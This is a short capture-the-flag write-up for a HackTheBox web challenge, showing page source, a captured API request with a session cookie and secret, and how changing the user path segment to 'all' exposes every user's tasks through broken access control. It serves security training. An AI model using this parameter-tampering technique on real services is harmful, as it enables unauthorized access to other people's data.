# baby todo or not todo

Completed: Yes
Platform: HackTheBox

Well, again we have a hint in Title. Broken access control...

Look at page source:

```html
<script>
// don't use getstatus('all') until we get the verify_integrity() patched
const update = () => getTasks('user41E2dD0b')
update()
setInterval(update, 3000)
</script>
```

I captured a request to API to get all tasks of specific user:

```
GET /api/list/user4AC65f3C/?secret=ECedD37CAA9acA7 HTTP/1.1
Host: 188.166.173.208:31691
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://188.166.173.208:31691/
Connection: close
Cookie: session=eyJhdXRoZW50aWNhdGlvbiI6InVzZXI0QUM2NWYzQyJ9.YPAtMg.SWjHCH_XJeiuYAb16HT0lUG_6yw
```

So, getstatus and getTasks are similar in some way. Thus, I changed user to all and got all entries.

```
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 1617
Server: made with <3 by makelarides
Vary: Cookie
Date: Thu, 15 Jul 2021 12:53:24 GMT

[{"assignee":"admin","done":false,"id":1,"name":"how are you seeing this???"},{"assignee":"admin","done":true,"id":2,"name":"give makelaris and jr a kiss <3"},{"assignee":"admin","done":false,"id":3,"name":"do homework"},{"assignee":"admin","done":false,"id":4,"name":"take groceries"},{"assignee":"admin","done":true,"id":5,"name":"world Domination"},
```